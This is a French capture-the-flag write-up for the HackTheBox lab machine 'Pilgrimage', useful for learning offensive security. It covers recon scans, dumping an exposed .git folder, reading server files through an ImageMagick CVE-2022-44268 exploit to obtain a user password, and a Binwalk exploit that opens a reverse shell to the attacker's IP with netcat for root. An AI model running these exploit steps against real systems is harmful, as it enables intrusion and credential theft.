# Pilgrimage

	echo "10.10.11.219 pilgrimage.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.219 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 10.10.11.219 -oN nmap.txt
	feroxbuster --silent -u http://pilgrimage.htb

Scans classiques.

	PORT STATE SERVICE VERSION  
	22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)  
	80/tcp open http nginx 1.18.0

La page d'accueil du site est simplement une fonctionnalité de rétrécissement d'images. Il y a une page de login et une page d'enregistrement mais elles renvoient systématiquement des erreurs et il semble impossible de s'enregistrer. 

En revanche, avec les scans j'ai trouvé un dossier http://pilgrimage.htb/.git/ en 403 et un fichier http://pilgrimage.htb/.git/HEAD que j'ai pu télécharger. 

Scans complémentaires : 

	ffuf -u http://pilgrimage.htb/.git/FUZZ -w ~/wordlists/dirb_big.txt -e .pdf,.php,.txt,.ini,.conf,.log,.html,.js,.bak,.zip -fc 403
	feroxbuster --silent -u http://pilgrimage.htb/.git/
	dirb http://pilgrimage.htb/.git/
	
La plupart des sous-dossiers testés à la main renvoient une 403 mais j'ai décidé de fiabiliser le processus : 

	python3 ~/git-dumper.py http://pilgrimage.htb/.git/ ~/dump
	cd ~/dump/
	tree -a

Rien d'intéressant dans le dossier .git/ mais on a l'exécutable utilisé pour la réduction d'image : 

	./magick --version

> Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911

Voir : 
  - https://www.metabaseq.com/imagemagick-zero-days/
  - https://github.com/voidz0r/CVE-2022-44268

</br>

    git clone https://github.com/voidz0r/CVE-2022-44268
    cd  CVE-2022-44268
    cargo run "/etc/passwd"

	
Retourner sur le site web et rétrécir l'image obtenue avec la fonctionnalité du site.
</br>Noter l'URL obtenue.
</br>Convertir le résultat obtenu en hexadécimal.

	curl http://pilgrimage.htb/shrunk/64bce0ae178b5.png --output resultat.png
	identify -verbose resultat.png
	echo "726f6f743a...16c73650a" | xxd -r -p
	

J'obtiens bien le fichier **/etc/passwd** du serveur. 
</br>Ma première idée était d'aller chercher les clés SSH des utilisateurs ayant un shell de type **/bin/bash** mais cela n'a fonctionné pour aucun d'entre eux. Il fallait en fait se diriger vers la base de données que l'on trouve dans la page **dashboard.php** : **/var/db/pilgrimage**

Je répète l'opération : 

	cargo run "/var/db/pilgrimage"
	...
	curl http://pilgrimage.htb/shrunk/64bced05eef1e.png --output resultat.png
	identify -verbose resultat.png
	echo "53514c697465...000000000" | xxd -r -p

On obtient le mot de passe pour Emily.

	ssh emily@10.10.11.219
	cat user.txt

### Élévation de privilèges : 

Je vois qu'il y a un Pspy déjà installé dans le dossier d'Emily, cela a l'air d'être un gros indice et je l'ai lancé en parallèle dans une deuxième fenêtre au cas où.

	./pspy64

> 2023/07/23 19:12:39 CMD: UID=0 PID=711 | /bin/bash /usr/sbin/malwarescan.sh

	cat /usr/sbin/malwarescan.sh
	
Ce script surveille le dossier **/var/www/pilgrimage.htb/shrunk/** et inspecte le contenu des images qui arrivent dedans avec **Binwalk**.

	binwalk -h 

> Binwalk v2.3.2

Des exploits existent pour cette version de Binwalk.
</br>Voir : https://www.exploit-db.com/exploits/51249

	python3  ~/000_exploits/exploit_Binwalk_v2.3.2.py resultat.png 10.10.16.26 9999
	sudo cp binwalk_exploit.png /var/www/html
	rlwrap nc -nvlp 9999
	==========
	wget http://10.10.16.26/binwalk_exploit.png
	cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/image.png
	ls /var/www/pilgrimage.htb/shrunk/

Ne pas hésiter à reproduire l'exploit directement en local dans la machine cible pour fiabiliser. 
</br>Renommer les images pour avoir plusieurs versions en parallèle et multiplier les chances de déclencher le shell. 
</br>J'obtiens la connexion quelques minutes après : 

	...
	whoami
	cat /root/root.txt
